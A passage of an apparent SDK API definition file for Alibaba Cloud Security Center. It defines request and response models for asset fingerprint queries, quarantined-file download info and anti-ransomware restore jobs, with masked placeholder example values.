      createTimestamp?: long(name='CreateTimestamp', description='The latest collection timestamp, which indicates the last timestamp when Security Center collected the information about the middleware, database, or web service. Unit: milliseconds.', example='1597987834000'),
      imageName?: string(name='ImageName', description='The name of the image.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller****'),
      instanceId?: string(name='InstanceId', description='The ID of the server on which the middleware, database, or web service is run.', example='i-2zeclqj7ti****'),
      instanceName?: string(name='InstanceName', description='The name of the server on which the middleware, database, or web service is run.', example='Test01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server on which the middleware, database, or web service is run.', example='47.42.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the middleware, database, or web service is run.', example='192.210.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the server on which the middleware, database, or web service is run.', example='47.42.XX.XX'),
      listenIp?: string(name='ListenIp', description='The IP address that the process monitors.', example='0.0.XX.XX'),
      listenProtocol?: string(name='ListenProtocol', description='The protocol of the traffic on which the process listens. Valid values:

*   **UDP**
*   **TCP**', example='UDP'),
      listenStatus?: string(name='ListenStatus', description='The listening status of the process. Valid values:

*   **NONE**: not listening
*   **LISTEN**: listening', example='NONE'),
      name?: string(name='Name', description='The name of the middleware, database, or web service.', example='openssl'),
      path?: string(name='Path', description='The path of the middleware, database, or web service.', example='/usr/lib64/libssl.so.1.0.2k'),
      pid?: string(name='Pid', description='The PID.', example='756'),
      podName?: string(name='PodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
      port?: string(name='Port', description='The port of the middleware, database, or web service.', example='68'),
      ppid?: string(name='Ppid', description='The ID of the parent process.', example='1'),
      processStarted?: long(name='ProcessStarted', description='The timestamp when the process starts. Unit: milliseconds.', example='1596539788'),
      processUser?: string(name='ProcessUser', description='The name of the user who runs the process.', example='root'),
      proof?: string(name='Proof', description='The version verification information about the middleware, database, or web service.', example='/usr/lib64/libssl.so.1.0.2k'),
      runtimeEnvVersion?: string(name='RuntimeEnvVersion', description='The version of the runtime environment.

>  The value of this parameter can be the Java Development Kit (JDK) version of the runtime environment for a Java process.', example='1.8.0_144'),
      type?: string(name='Type', description='The type of the middleware, database, or web service.', example='library'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the middleware, database, or web service is run.', example='uuid-02ebabe7-1c19-a****'),
      version?: string(name='Version', description='The version of the middleware, database, or web service.', example='1.0.2k'),
      webPath?: string(name='WebPath', description='The web directory.', example='/usr/share/nginx/html'),
    }
  ](name='Propertys', description='The details about the asset fingerprints returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9146867-16C8-4AAB-BB4FB8C2A4'),
}

model DescribePropertyScaDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScaDetailResponseBody(name='body'),
}

async function describePropertyScaDetail(request: DescribePropertyScaDetailRequest): DescribePropertyScaDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyScaDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyScaItemRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **sca**: middleware
*   **sca_database**: database
*   **sca_web**: web service

> If you do not specify this parameter, the default value **sca** is used, which indicates that middleware fingerprints are queried.', example='sca', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='false', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  searchInfo?: string(name='SearchInfo', description='The search keyword. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If the **SearchItem** parameter is set to **name**, you must enter the name of an asset fingerprint.

*   If the **SearchItem** parameter is set to **type**, you must enter the type of an asset fingerprint. Valid values:

    *   **system_service**: system service
    *   **software_library**: software library
    *   **docker_component**: container component
    *   **database**: database
    *   **web_container**: web container
    *   **jar**: JAR package
    *   **web_framework**: web framework

> You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='system_service', position='Query'),
  searchItem?: string(name='SearchItem', description='The type of the search condition. Valid values:

*   **name**: the name of a database, middleware, or web service
*   **type**: the type of a database, middleware, or web service

> You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='type', position='Query'),
}

model DescribePropertyScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='27'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      bizType?: string(name='BizType', description='The type of the middleware, database, or web service. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='docker_component'),
      count?: int32(name='Count', description='The number of servers on which the middleware is run.', example='23'),
      name?: string(name='Name', description='The name of the middleware.', example='kubelet'),
      typeDisplay?: string(name='TypeDisplay', description='The display name of the middleware type.', example='Docker Component'),
    }
  ](name='PropertyItems', description='An array that consists of the information about middleware fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3F4236AB-7070-538D-85EB-98EBFE6C****'),
}

model DescribePropertyScaItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScaItemResponseBody(name='body'),
}

async function describePropertyScaItem(request: DescribePropertyScaItemRequest): DescribePropertyScaItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyScaItem', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyScheduleConfigRequest {
  type: string(name='Type', description='The type of the asset fingerprints. Valid values:

*   **scheduler_port_period**: listening port
*   **scheduler_process_period**: running process
*   **scheduler_account_period**: account
*   **scheduler_software_period**: software
*   **scheduler_cron_period**: scheduled task
*   **scheduler_sca_period**: middleware
*   **scheduler_autorun_period**: startup item
*   **scheduler_lkm_period**: kernel module
*   **scheduler_sca_proxy_period**: website', example='scheduler_autorun_period', position='Query'),
}

model DescribePropertyScheduleConfigResponseBody = {
  config?: string(name='Config', description='The configuration time. Unit: hours.

>  A value **0** indicates that asset fingerprint collection is disabled for this type of asset.', example='3'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribePropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScheduleConfigResponseBody(name='body'),
}

async function describePropertyScheduleConfig(request: DescribePropertyScheduleConfigRequest): DescribePropertyScheduleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyScheduleConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertySoftwareDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1', position='Query'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by software name is supported. If you want to use fuzzy search, set the parameter to 1. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1', position='Query'),
  installTimeEnd?: long(name='InstallTimeEnd', description='The timestamp generated when the software update ends. Unit: milliseconds.', example='1650012695000', position='Query'),
  installTimeStart?: long(name='InstallTimeStart', description='The timestamp generated when the software update starts. Unit: milliseconds.', example='1649321495000', position='Query'),
  name?: string(name='Name', description='The name of the software.', example='kernel', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='10', position='Query'),
  path?: string(name='Path', description='The installation path of the software.', example='/etc/test', position='Query'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX', position='Query'),
  softwareVersion?: string(name='SoftwareVersion', description='The version of the software.', example='3.10.0', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-****', position='Query'),
}

model DescribePropertySoftwareDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp generated when the last asset fingerprint collection is performed. Unit: milliseconds.', example='1649149566000'),
      installTime?: string(name='InstallTime', description='The time at which the software is installed.', example='2022-04-07 10:54:49'),
      installTimeDt?: long(name='InstallTimeDt', description='The timestamp generated when the software is installed. Unit: milliseconds.', example='1649066826000'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP addresses of the server.', example='192.168.XX.XX'),
      name?: string(name='Name', description='The name of the software.', example='aaa_base'),
      path?: string(name='Path', description='The installation path of the software.', example='/etc/test'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
      version?: string(name='Version', description='The version of the software.', example='3.10.0'),
    }
  ](name='Propertys', description='The details of the software asset.'),
  requestId?: string(name='RequestId', description='The request ID.', example='6AEE7412-0065-1135-B790-AE2C38BA68FB'),
}

model DescribePropertySoftwareDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertySoftwareDetailResponseBody(name='body'),
}

async function describePropertySoftwareDetail(request: DescribePropertySoftwareDetailRequest): DescribePropertySoftwareDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertySoftwareDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertySoftwareItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true', position='Query'),
  name?: string(name='Name', description='The name of the software that you want to query.', example='test', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10', position='Query'),
}

model DescribePropertySoftwareItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='2'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='5037'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers on which the software is installed.', example='23'),
      name?: string(name='Name', description='The name of the software.', example='aaa_base'),
    }
  ](name='PropertyItems', description='An array that consists of the software assets returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='3A85CFCF-05C8-451A-9E41-C0D5E96BA407'),
}

model DescribePropertySoftwareItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertySoftwareItemResponseBody(name='body'),
}

async function describePropertySoftwareItem(request: DescribePropertySoftwareItemRequest): DescribePropertySoftwareItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertySoftwareItem', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyTypeScaItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
}

model DescribePropertyTypeScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  propertyTypeItems?: [ 
    {
      name?: string(name='Name', description='The name of the middleware type.', example='Docker Component'),
      type?: string(name='Type', description='The type of the middleware. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='docker_component'),
    }
  ](name='PropertyTypeItems', description='An array that consists of the middleware types.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A839E8-70AE-591D-8D9E-C5419A22****'),
}

model DescribePropertyTypeScaItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyTypeScaItemResponseBody(name='body'),
}

async function describePropertyTypeScaItem(request: DescribePropertyTypeScaItemRequest): DescribePropertyTypeScaItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyTypeScaItem', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyUsageNewestRequest {
  type?: string(name='Type', example='user', position='Query'),
}

model DescribePropertyUsageNewestResponseBody = {
  itemCount?: int32(name='ItemCount', example='5'),
  newestStatisticItems?: [ 
    {
      create?: long(name='Create', example='1566178646000'),
      name?: string(name='Name', example='root'),
    }
  ](name='NewestStatisticItems'),
  requestId?: string(name='RequestId'),
  type?: string(name='Type', example='user'),
}

model DescribePropertyUsageNewestResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUsageNewestResponseBody(name='body'),
}

async function describePropertyUsageNewest(request: DescribePropertyUsageNewestRequest): DescribePropertyUsageNewestResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyUsageNewest', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyUserDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  extend?: string(name='Extend', description='Specifies whether the fuzzy search by account name is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1', position='Query'),
  isRoot?: string(name='IsRoot', description='Specifies whether the account has root permissions. Valid values:

*   **0**: no
*   **1**: yes', example='0', position='Query'),
  lastLoginTimeEnd?: long(name='LastLoginTimeEnd', description='The timestamp of the last logoff from the account. Unit: milliseconds.', example='164922523600', position='Query'),
  lastLoginTimeStart?: long(name='LastLoginTimeStart', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='164922523600', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX', position='Query'),
  user?: string(name='User', description='The name of the account to which the server belongs.', example='bin', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****', position='Query'),
}

model DescribePropertyUserDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      accountsExpirationDate?: string(name='AccountsExpirationDate', description='The date on which the account expires.', example='never'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp at which the last asset fingerprint collection is performed. Unit: milliseconds.', example='1649149566000'),
      groupNames?: [ string ](name='GroupNames', description='The details of the user groups to which the account belongs.'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP addresses of the server.', example='192.168.XX.XX'),
      isCouldLogin?: int32(name='IsCouldLogin', description='Indicates whether the account is an interactive logon account. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isPasswdExpired?: int32(name='IsPasswdExpired', description='Indicates whether the password expires. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      isPasswdLocked?: int32(name='IsPasswdLocked', description='Indicates whether the password is locked. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      isRoot?: string(name='IsRoot', description='Indicates whether the account has root permissions. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isSudoer?: int32(name='IsSudoer', description='Indicates whether the account is a sudo account. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isUserExpired?: int32(name='IsUserExpired', description='Indicates whether the account expires. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      lastLoginIp?: string(name='LastLoginIp', description='The source IP address of the last logon to the account.', example='192.168.XX.XX'),
      lastLoginTime?: string(name='LastLoginTime', description='The last logon time of the account.', example='2022-04-04 18:07:06'),
      lastLoginTimeDt?: long(name='LastLoginTimeDt', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='1649066826000'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='1649066826000'),
      passwordExpirationDate?: string(name='PasswordExpirationDate', description='The date on which the password of the account expires.', example='never'),
      status?: string(name='Status', description='This parameter is deprecated. You can ignore it.', example='**'),
      user?: string(name='User', description='The name of the account.', example='bin'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The details of asset fingerprints for the account.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='33A71BE3-2CC2-14CB-B460-33A1DD82953A'),
}

model DescribePropertyUserDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUserDetailResponseBody(name='body'),
}

async function describePropertyUserDetail(request: DescribePropertyUserDetailRequest): DescribePropertyUserDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyUserDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyUserItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='2', position='Query'),
  user?: string(name='User', description='The information about the account.', example='adm', position='Query'),
}

model DescribePropertyUserItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='2'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='114'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers that belong to the account.', example='384'),
      user?: string(name='User', description='The name of the account.', example='adm'),
    }
  ](name='PropertyItems', description='An array that consists of the account information returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='76068BE2-F9C4-4EDD-967B-F503B8CCDD3D'),
}

model DescribePropertyUserItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUserItemResponseBody(name='body'),
}

async function describePropertyUserItem(request: DescribePropertyUserItemRequest): DescribePropertyUserItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyUserItem', 'POST', '/', 'json', false, 'json', request);
}

model DescribeQuaraFileDownloadInfoRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas', position='Query'),
  quaraFileId?: int32(name='QuaraFileId', description='The ID of the quarantined file.

> If you do not specify this parameter, you cannot call the RollbackSuspEventQuaraFile operation to restore a quarantined file. You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.', example='123', position='Query'),
}

model DescribeQuaraFileDownloadInfoResponseBody = {
  downloadUrl?: string(name='DownloadUrl', description='The URL that is used to download the file. The URL is valid for five minutes.', example='https://xxxxxxxx.oss-cn-hangzhou-1.aliyuncs.com/xxxxx/xxxxxxxxxxxxxx?Expires=1671448125&OSSAccessKeyId=xxx'),
  md5?: string(name='Md5', description='The MD5 hash value of the quarantined file.', example='bb62ef1311bc564377a0378d3axxxxxx'),
  path?: string(name='Path', description='The file path.', example='/etc/test'),
  quaraFileId?: int32(name='QuaraFileId', description='The ID of the quarantined file.', example='123'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='29874225-EAAC-5415-8501-32DD20FXXXXX'),
  tag?: string(name='Tag', description='The tag that is added to the related alert.', example='6d4ff40a22b15c86adecf2aa48xxxxx'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model DescribeQuaraFileDownloadInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeQuaraFileDownloadInfoResponseBody(name='body'),
}

async function describeQuaraFileDownloadInfo(request: DescribeQuaraFileDownloadInfoRequest): DescribeQuaraFileDownloadInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeQuaraFileDownloadInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRestoreJobsRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  machineRemark?: string(name='MachineRemark', description='The unique identifier of the server on which the restoration task is run. For example, you can use the IP address or the name of the server.', example='1.1.XX.XX', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **RUNNING**: The task is running.
*   **COMPLETE**: The task is complete.
*   **FAILED**: The task fails.
*   **CANCELING**: The task is being canceled.
*   **CANCELED**: The task is canceled.
*   **PARTIAL_COMPLETE**: The task is partially successful.
*   **CREATED**: The task was created but is not run.
*   **EXPIRED**: The task is not updated.
*   **QUEUED**: The task is waiting to be run.
*   **CLIENT_DELETED**: The task fails because the anti-ransomware agent is uninstalled.', example='RUNNING', position='Query'),
}

model DescribeRestoreJobsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of restoration tasks returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of restoration tasks returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0ED92280-4363-57D3-A4D3-4D3FBC99B29F'),
  restoreJobs?: [ 
    {
      actualBytes?: long(name='ActualBytes', description='The size of the backup file. Unit: bytes.', example='20'),
      bytesDone?: long(name='BytesDone', description='The total size of data that is restored. Unit: bytes.', example='20'),
      bytesTotal?: long(name='BytesTotal', description='The total size of data that you want to restore. Unit: bytes.', example='20'),
      clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent that is used to perform the restoration task.', example='c-000frxwusjauhp9ajpu6'),
      completeTime?: long(name='CompleteTime', description='The timestamp when the restoration task is complete. Unit: milliseconds.', example='1583289054000'),
      createdTime?: long(name='CreatedTime', description='The timestamp when the restoration task is created. Unit: milliseconds.', example='1583289052000'),
      duration?: long(name='Duration', description='The duration of the restoration task. Unit: seconds.', example='100'),
      errorCount?: long(name='ErrorCount', description='The number of the restoration tasks on which errors occur.', example='0'),
      errorFile?: string(name='ErrorFile', description='The name of the CSV file. The CSV file contains the files that fail to be restored.', example='s-000f4wxm8f7gur6g2otm.csv'),
      errorFileUrl?: string(name='ErrorFileUrl', description='The URL to download the CSV file. The CSV file contains the files that fail to be restored.', example='["/home/user"]'),
      errorType?: string(name='ErrorType', description='The error code that is returned for the restoration task.', example='NONE'),
      eta?: long(name='Eta', description='The timestamp when the in-progress restoration task is expected to be complete. Unit: seconds.', example='1583299054'),
      excludes?: string(name='Excludes', description='The directory excluded from the anti-ransomware policy. The value is the directory that you specify to skip protection when you create the anti-ransomware policy.', example='["/home/user"]'),
      exitCode?: string(name='ExitCode', description='The return value of the restoration task.', example='0'),
      gmtCreate?: string(name='GmtCreate', description='The time when the restoration task is created.', example='2021-04-25T19:11Z'),
      gmtModified?: string(name='GmtModified', description='The time when the restoration task is updated.', example='2021-04-25T19:11Z'),
      includes?: string(name='Includes', description='The directory in which the restored file is stored. The value is the directory that you specify for protection when you create the anti-ransomware policy', example='["/root/disk-uuid-test","/root/install.sh"]'),
      instanceId?: string(name='InstanceId', description='The ID of the server whose data you want to restore.', example='i-bp12xnvdax6307gw****'),
      instanceName?: string(name='InstanceName', description='The name of the server whose data you want to restore.', example='win2012-01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server whose data you want to restore.', example='1.1.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The internal IP address of the server whose data you want to restore.', example='2.1.XX.XX'),
      itemsDone?: long(name='ItemsDone', description='The number of files that are restored.', example='0'),
      itemsTotal?: long(name='ItemsTotal', description='The total number of files that need to be restored.', example='0'),
      message?: string(name='Message', description='The error message.', example='successful'),
      percentage?: int32(name='Percentage', description='The progress of the restoration task in percentage.', example='100'),
      requestId?: string(name='RequestId', description='The request ID.', example='0ED92280-4363-57D3-A4D3-4D3FBC99B29F'),
      restoreId?: string(name='RestoreId', description='The ID of the restoration task.', example='r-000gmcypy5dyf9ey3uv7'),
      restoreName?: string(name='RestoreName', description='The name of the restoration task.', example='Restore'),
      restoreType?: string(name='RestoreType', description='The type of the file that is restored. Valid values:

*   **ECS_FILE**: files on Elastic Compute Service (ECS) instances
*   **FILE**: files on servers in data centers', example='ECS_FILE'),
      snapshotHash?: string(name='SnapshotHash', description='The hash value of the snapshot that stores backup data when the data is backed up.', example='a3992de83f529b844135fe795d949181735a7d20e0ac8539485c61b7983e618f'),
      snapshotId?: string(name='SnapshotId', description='The hash value ID of the snapshot that stores backup data when the data is backed up.', example='s-000gmcypy5dy54e39yny'),
      snapshotVersion?: string(name='SnapshotVersion', description='The version of the backup data.', example='2020-03-03 18:00'),
      source?: string(name='Source', description='The restored content.', example='["/home/admin","\\\\\\\\servername\\\\sharename"]'),
      sourceClientId?: string(name='SourceClientId', description='The ID of the anti-ransomware agent that is used to back up data.', example='c-000gmcypy5dyf9ey3uv7'),
      speed?: long(name='Speed', description='The speed at which data is restored. Unit: byte/s.', example='25766558'),
      status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **RUNNING**: The task is running.
*   **COMPLETE**: The task is complete.
*   **FAILED**: The task fails.
*   **CANCELING**: The task is being canceled.
*   **CANCELED**: The task is canceled.
*   **PARTIAL_COMPLETE**: The task is partially successful.
*   **CREATED**: The task was created but is not run.
*   **EXPIRED**: The task is not updated.
*   **QUEUED**: The task is waiting to be run.
*   **CLIENT_DELETED**: The task fails because the anti-ransomware agent is uninstalled.', example='COMPLETE'),
      target?: string(name='Target', description='The folder to which the backup data is restored. After you create the restoration task, the backup data is restored to the specified folder.', example='/home'),
      updatedTime?: long(name='UpdatedTime', description='The timestamp when the restoration task was last updated. Unit: milliseconds.', example='1583289054000'),
      uuid?: string(name='Uuid', description='The UUID of the server whose data you want to restore.', example='6E3DABB6-3F6A-40DB-9492-2C8B59C****'),
      vaultId?: string(name='VaultId', description='The ID of the backup vault in which the backup data is stored.', example='v-000b0v0jqzmse2yz06zw'),
    }
  ](name='RestoreJobs', description='The details about the restoration task.'),
}

model DescribeRestoreJobsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRestoreJobsResponseBody(name='body'),
}

/**
  * If the data on your servers is encrypted by ransomware, you can create a restoration task to restore the data on your servers by using backup data in Security Center.
  * >  After you enable an anti-ransomware policy, the data on your servers is backed up based on the policy. For more information about anti-ransomware policies, see [Manage protection policies](~~164781~~).
  *
 */
async function describeRestoreJobs(request: DescribeRestoreJobsRequest): DescribeRestoreJobsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRestoreJobs', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRestorePlansRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
